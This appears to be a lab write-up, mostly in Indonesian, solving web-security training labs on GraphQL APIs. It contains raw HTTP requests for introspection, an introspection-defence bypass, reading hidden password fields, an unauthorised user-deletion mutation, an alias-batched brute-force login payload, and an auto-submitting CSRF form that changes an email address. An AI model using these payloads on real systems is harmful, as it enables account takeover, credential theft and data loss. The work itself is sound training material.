
## Common endpoint names

GraphQL services often use similar endpoint suffixes. When testing for GraphQL endpoints, you should look to send universal queries to the following locations:

- `/graphql`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`

## Metode permintaan

Langkah selanjutnya dalam mencoba menemukan titik akhir GraphQL adalah menguji menggunakan metode permintaan yang berbeda.

Praktik terbaik untuk titik akhir produksi GraphQL adalah hanya menerima permintaan POST yang memiliki tipe konten `application/json`, karena hal ini membantu melindungi dari kerentanan CSRF. Namun, beberapa titik akhir mungkin menerima metode alternatif, seperti permintaan GET atau permintaan POST yang menggunakan tipe konten `x-www-form-urlencoded`.


## Memanfaatkan argumen yang tidak bersih - Lanjutan

Misalnya, kueri di bawah ini meminta daftar produk untuk toko online:

```json
query {
  products {
    id
    name
    listed
  }
}

```

Daftar produk yang dikembalikan hanya berisi produk yang terdaftar.

```json
{
  "data": {
    "products": [
      {
        "id": 1,
        "name": "Product 1",
        "listed": true
      },
      {
        "id": 2,
        "name": "Product 2",
        "listed": true
      },
      {
        "id": 4,
        "name": "Product 4",
        "listed": true
      }
    ]
  }
}
```

Dari informasi ini, kami dapat menyimpulkan hal-hal berikut:

- Produk diberi ID berurutan.
- ID Produk 3 tidak ada dalam daftar, mungkin karena telah dihapus dari daftar.

Dengan menanyakan ID produk yang hilang, kami bisa mendapatkan detailnya, meskipun tidak terdaftar di toko dan tidak dikembalikan oleh permintaan produk asli.

```json
query 
	{ 
	 product(id: 3) 
	 { 
		id 
		name 
		listed 
	  } 
	}
```

```json
query {
  "data": {
    "product": {
      "id": 3,
      "name": "Product 3",
      "listed": "no"
    }
  }
}

```


---

# **SOLVE LAB:**


---

**LAB 1**

di sini saya mencari endpoint grapql terlebih dahulu, setelah mendapatakan endpoind nya saya menggunakan query 

```json
POST /graphql/v1 HTTP/2
Host: 0a7e001e04b4a59380c58ac7009d00b2.web-security-academy.net
Cookie: session=QowTnluzKRLLEUX9on6zj9zAkI3QqALL
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a7e001e04b4a59380c58ac7009d00b2.web-security-academy.net/post?postId=4
Content-Type: application/json
Content-Length: 106
Origin: https://0a7e001e04b4a59380c58ac7009d00b2.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers

{"query":"{__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}"}
```


untuk mencari filed apa aja yang tersedia, setelah itu 

```json
POST /graphql/v1 HTTP/2
Host: 0a7e001e04b4a59380c58ac7009d00b2.web-security-academy.net
Cookie: session=QowTnluzKRLLEUX9on6zj9zAkI3QqALL
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a7e001e04b4a59380c58ac7009d00b2.web-security-academy.net/post?postId=4
Content-Type: application/json
Content-Length: 281
Origin: https://0a7e001e04b4a59380c58ac7009d00b2.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers

{"query":"\n    query getBlogPost($id: Int!) {\n        getBlogPost(id: $id) {\n            image\n            title\n            author\n            date\n            paragraphs\n  isPrivate\n       postPassword\n      }\n    }","operationName":"getBlogPost","variables":{"id":3}}
```

dan akan mendapatkan sebuah password nya

```json
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3203

{
  "data": {
    "getBlogPost": {
      "image": "/image/blog/posts/24.jpg",
      "title": "The Reverse Bucket List",
      "author": "Neil Beforeme",
      "date": "2024-08-20T15:52:06.922Z",
      "paragraphs": [
        "I have yet to create a bucket list, mainly because I'm not very adventurous and don't want to do anything that will scare the pants off me. With my weekends wasting away with a huge dose of apathy and only a spoonful of activity, I felt it was time to try something new. I like to call it the Reverse Bucket List, doing things you think you should do, but don't really want to.",
        "The first class I signed up to was freefall yoga. I wasn't sure of the freefall part but I'd seen great videos of people doing yoga in hammock type things and thought it would probably be a bit like that. At this point it's worth mentioning I hate yoga, I thought I'd start with the things I hate the most and work up.",
        "Weeks of grueling body bending ensued and not a hammock in sight. The only falling taking place was when I tried to get out of bed in the mornings. Why would something that promotes suppleness and fitness leave you incapable of descending the stairs and leave you with the added inability to dress yourself as you can no longer lift your arms above your head?",
        "The day of certification was drawing close and there seemed to be great excitement among the group. We were rather oddly, I thought, asked to meet the following weekend at a local airfield. It was to be a weekend affair with swanky overnight accommodation and Canap's. On arrival, we were greeted with a glass of champagne and asked to change into our yoga gear. What followed next will haunt me until the day I die.",
        "If I didn't recognize my group and our yogini, I would have assumed I'd turned up at the wrong venue and made my excuses. It is not unheard of for me to turn up at the wrong venue. At the end of a long weekend of parachute drills - which I assumed was all in aid of team building - we were led out to the airstrip and boarded a light aircraft. It was at this point I started to get a little suspicious. We were instructed to begin our descent in a Chakrasana position, double flip it, twist into a Trikonasana, and land in a Tadasana.",
        "Jumping from an airplane has never been on my Bucket List, and certainly not on my reverse bucket list. Despite my squealing protests, I was pushed forward until I was teetering on the edge of despair. Someone shouted, 'assume the pose' as I flopped into a downward descent. There were poses, none of them yoga poses, I made a star jump as I floundered to find something to hold on to, nothing but air up there. I then passed out and miraculously landed on a large trampoline bouncing me back up into the air, inadvertently landing in a Gomukhasana. To those of you who don't know what that is, it basically looks like a jumbled mess.",
        "Needless to say, there wasn't a certificate presented to me that day. I am now reevaluating my life goals and reading the small print in all paperwork from now on."
      ],
      "isPrivate": true,
      "postPassword": "gdkx4hlauabey77y8ydax0xr3iq6evw3"
    }
  }
}
```


**LAB 2**

cara nya hampir sama kayak  **Lab 1** ,

```json
POST /graphql/v1 HTTP/2
Host: 0a12006104090d1e8347786200510083.web-security-academy.net
Cookie: session=YwK1fJ0zaVkC0MBwsPwCNkfKCa35CjED
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a12006104090d1e8347786200510083.web-security-academy.net/login
Content-Type: application/json
Content-Length: 198
Origin: https://0a12006104090d1e8347786200510083.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{
  "query": "\n    query getUser($id: Int!) {\n        getUser(id: $id) {\n            id\n            username\n            password\n        }\n    }",
  "variables": {
    "id": 1
  }
}
```

## Bypassing GraphQL introspection defenses 

	Introspection probe as GET request GET 


```json
/graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```



**LAB 3**

```json
GET /api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A HTTP/2
Host: 0a8800dd04ac22d184fda07e001d009e.web-security-academy.net
Cookie: session=vLRk2d3phltRxEycJPj7D25oDGXcfGA0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers


```

```json
GET /api?query=mutation+%7B%0A%09deleteOrganizationUser%28input%3A%7Bid%3A+3%7D%29+%7B%0A%09%09user+%7B%0A%09%09%09id%0A%09%09%7D%0A%09%7D%0A%7D HTTP/2
Host: 0a8800dd04ac22d184fda07e001d009e.web-security-academy.net
 http/2: 
Cookie: session=vLRk2d3phltRxEycJPj7D25oDGXcfGA0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

QUERY NYA

```json
mutation {
	deleteOrganizationUser(input:{id: 3}) {
		user {
			id
		}
	}
}
               
```

## Melewati batasan tarif menggunakan alias

Contoh sederhana di bawah ini menunjukkan serangkaian kueri alias yang memeriksa apakah kode diskon toko valid. Operasi ini berpotensi melewati pembatasan tarif karena ini merupakan permintaan HTTP tunggal, meskipun berpotensi digunakan untuk memeriksa sejumlah besar kode diskon sekaligus.

```json
#Request with aliased queries

query isValidDiscount($code: Int) {
  isvalidDiscount(code: $code) {
    valid
  }
  isValidDiscount2: isValidDiscount(code: $code) {
    valid
  }
  isValidDiscount3: isValidDiscount(code: $code) {
    valid
  }
}

```


**LAB 4**

```json
POST /graphql/v1 HTTP/2
Host: 0aa300b2036f858e81840cbe00070053.web-security-academy.net
Cookie: session=pnjPqJikoNZTWRZtIMtXqAZUvcjIcTGa
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Priority: u=0, i
Te: trailers
Accept: application/json
Content-Type: application/json
Content-Length: 8970

{
  "query": "mutation{bruteforce0:login(input:{password: \"123456\", username: \"carlos\"}) { token success } bruteforce1:login(input:{password: \"password\", username: \"carlos\"}) { token success } bruteforce2:login(input:{password: \"12345678\", username: \"carlos\"}) { token success } bruteforce3:login(input:{password: \"qwerty\", username: \"carlos\"}) { token success } bruteforce4:login(input:{password: \"123456789\", username: \"carlos\"}) { token success } bruteforce5:login(input:{password: \"12345\", username: \"carlos\"}) { token success } bruteforce6:login(input:{password: \"1234\", username: \"carlos\"}) { token success } bruteforce7:login(input:{password: \"111111\", username: \"carlos\"}) { token success } bruteforce8:login(input:{password: \"1234567\", username: \"carlos\"}) { token success } bruteforce9:login(input:{password: \"dragon\", username: \"carlos\"}) { token success } bruteforce10:login(input:{password: \"123123\", username: \"carlos\"}) { token success } bruteforce11:login(input:{password: \"baseball\", username: \"carlos\"}) { token success } bruteforce12:login(input:{password: \"abc123\", username: \"carlos\"}) { token success } bruteforce13:login(input:{password: \"football\", username: \"carlos\"}) { token success } bruteforce14:login(input:{password: \"monkey\", username: \"carlos\"}) { token success } bruteforce15:login(input:{password: \"letmein\", username: \"carlos\"}) { token success } bruteforce16:login(input:{password: \"shadow\", username: \"carlos\"}) { token success } bruteforce17:login(input:{password: \"master\", username: \"carlos\"}) { token success } bruteforce18:login(input:{password: \"666666\", username: \"carlos\"}) { token success } bruteforce19:login(input:{password: \"qwertyuiop\", username: \"carlos\"}) { token success } bruteforce20:login(input:{password: \"123321\", username: \"carlos\"}) { token success } bruteforce21:login(input:{password: \"mustang\", username: \"carlos\"}) { token success } bruteforce22:login(input:{password: \"1234567890\", username: \"carlos\"}) { token success } bruteforce23:login(input:{password: \"michael\", username: \"carlos\"}) { token success } bruteforce24:login(input:{password: \"654321\", username: \"carlos\"}) { token success } bruteforce25:login(input:{password: \"superman\", username: \"carlos\"}) { token success } bruteforce26:login(input:{password: \"1qaz2wsx\", username: \"carlos\"}) { token success } bruteforce27:login(input:{password: \"7777777\", username: \"carlos\"}) { token success } bruteforce28:login(input:{password: \"121212\", username: \"carlos\"}) { token success } bruteforce29:login(input:{password: \"000000\", username: \"carlos\"}) { token success } bruteforce30:login(input:{password: \"qazwsx\", username: \"carlos\"}) { token success } bruteforce31:login(input:{password: \"123qwe\", username: \"carlos\"}) { token success } bruteforce32:login(input:{password: \"killer\", username: \"carlos\"}) { token success } bruteforce33:login(input:{password: \"trustno1\", username: \"carlos\"}) { token success } bruteforce34:login(input:{password: \"jordan\", username: \"carlos\"}) { token success } bruteforce35:login(input:{password: \"jennifer\", username: \"carlos\"}) { token success } bruteforce36:login(input:{password: \"zxcvbnm\", username: \"carlos\"}) { token success } bruteforce37:login(input:{password: \"asdfgh\", username: \"carlos\"}) { token success } bruteforce38:login(input:{password: \"hunter\", username: \"carlos\"}) { token success } bruteforce39:login(input:{password: \"buster\", username: \"carlos\"}) { token success } bruteforce40:login(input:{password: \"soccer\", username: \"carlos\"}) { token success } bruteforce41:login(input:{password: \"harley\", username: \"carlos\"}) { token success } bruteforce42:login(input:{password: \"batman\", username: \"carlos\"}) { token success } bruteforce43:login(input:{password: \"andrew\", username: \"carlos\"}) { token success } bruteforce44:login(input:{password: \"tigger\", username: \"carlos\"}) { token success } bruteforce45:login(input:{password: \"sunshine\", username: \"carlos\"}) { token success } bruteforce46:login(input:{password: \"iloveyou\", username: \"carlos\"}) { token success } bruteforce47:login(input:{password: \"2000\", username: \"carlos\"}) { token success } bruteforce48:login(input:{password: \"charlie\", username: \"carlos\"}) { token success } bruteforce49:login(input:{password: \"robert\", username: \"carlos\"}) { token success } bruteforce50:login(input:{password: \"thomas\", username: \"carlos\"}) { token success } bruteforce51:login(input:{password: \"hockey\", username: \"carlos\"}) { token success } bruteforce52:login(input:{password: \"ranger\", username: \"carlos\"}) { token success } bruteforce53:login(input:{password: \"daniel\", username: \"carlos\"}) { token success } bruteforce54:login(input:{password: \"starwars\", username: \"carlos\"}) { token success } bruteforce55:login(input:{password: \"klaster\", username: \"carlos\"}) { token success } bruteforce56:login(input:{password: \"112233\", username: \"carlos\"}) { token success } bruteforce57:login(input:{password: \"george\", username: \"carlos\"}) { token success } bruteforce58:login(input:{password: \"computer\", username: \"carlos\"}) { token success } bruteforce59:login(input:{password: \"michelle\", username: \"carlos\"}) { token success } bruteforce60:login(input:{password: \"jessica\", username: \"carlos\"}) { token success } bruteforce61:login(input:{password: \"pepper\", username: \"carlos\"}) { token success } bruteforce62:login(input:{password: \"1111\", username: \"carlos\"}) { token success } bruteforce63:login(input:{password: \"zxcvbn\", username: \"carlos\"}) { token success } bruteforce64:login(input:{password: \"555555\", username: \"carlos\"}) { token success } bruteforce65:login(input:{password: \"11111111\", username: \"carlos\"}) { token success } bruteforce66:login(input:{password: \"131313\", username: \"carlos\"}) { token success } bruteforce67:login(input:{password: \"freedom\", username: \"carlos\"}) { token success } bruteforce68:login(input:{password: \"777777\", username: \"carlos\"}) { token success } bruteforce69:login(input:{password: \"pass\", username: \"carlos\"}) { token success } bruteforce70:login(input:{password: \"maggie\", username: \"carlos\"}) { token success } bruteforce71:login(input:{password: \"159753\", username: \"carlos\"}) { token success } bruteforce72:login(input:{password: \"aaaaaa\", username: \"carlos\"}) { token success } bruteforce73:login(input:{password: \"ginger\", username: \"carlos\"}) { token success } bruteforce74:login(input:{password: \"princess\", username: \"carlos\"}) { token success } bruteforce75:login(input:{password: \"joshua\", username: \"carlos\"}) { token success } bruteforce76:login(input:{password: \"cheese\", username: \"carlos\"}) { token success } bruteforce77:login(input:{password: \"amanda\", username: \"carlos\"}) { token success } bruteforce78:login(input:{password: \"summer\", username: \"carlos\"}) { token success } bruteforce79:login(input:{password: \"love\", username: \"carlos\"}) { token success } bruteforce80:login(input:{password: \"ashley\", username: \"carlos\"}) { token success } bruteforce81:login(input:{password: \"nicole\", username: \"carlos\"}) { token success } bruteforce82:login(input:{password: \"chelsea\", username: \"carlos\"}) { token success } bruteforce83:login(input:{password: \"biteme\", username: \"carlos\"}) { token success } bruteforce84:login(input:{password: \"matthew\", username: \"carlos\"}) { token success } bruteforce85:login(input:{password: \"access\", username: \"carlos\"}) { token success } bruteforce86:login(input:{password: \"yankees\", username: \"carlos\"}) { token success } bruteforce87:login(input:{password: \"987654321\", username: \"carlos\"}) { token success } bruteforce88:login(input:{password: \"dallas\", username: \"carlos\"}) { token success } bruteforce89:login(input:{password: \"austin\", username: \"carlos\"}) { token success } bruteforce90:login(input:{password: \"thunder\", username: \"carlos\"}) { token success } bruteforce91:login(input:{password: \"taylor\", username: \"carlos\"}) { token success } bruteforce92:login(input:{password: \"matrix\", username: \"carlos\"}) { token success } bruteforce93:login(input:{password: \"mobilemail\", username: \"carlos\"}) { token success } bruteforce94:login(input:{password: \"mom\", username: \"carlos\"}) { token success } bruteforce95:login(input:{password: \"monitor\", username: \"carlos\"}) { token success } bruteforce96:login(input:{password: \"monitoring\", username: \"carlos\"}) { token success } bruteforce97:login(input:{password: \"montana\", username: \"carlos\"}) { token success } bruteforce98:login(input:{password: \"moon\", username: \"carlos\"}) { token success } bruteforce99:login(input:{password: \"moscow\", username: \"carlos\"}) { token success }}"
}
```


**LAB 5**

```html
<html>
  <body>
    <form action="https://0adb00b5038e6f9583d85b320095004d.web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value="&#10;&#32;&#32;&#32;&#32;mutation&#32;changeEmail&#40;&#36;input&#58;&#32;ChangeEmailInput&#33;&#41;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;changeEmail&#40;input&#58;&#32;&#36;input&#41;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;email&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#125;&#10;&#32;&#32;&#32;&#32;&#125;&#10;" />
      <input type="hidden" name="operationName" value="changeEmail" />
      <input type="hidden" name="variables" value="&#123;&quot;input&quot;&#58;&#123;&quot;email&quot;&#58;&quot;pwned&#64;portswigger&#46;net&quot;&#125;&#125;" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```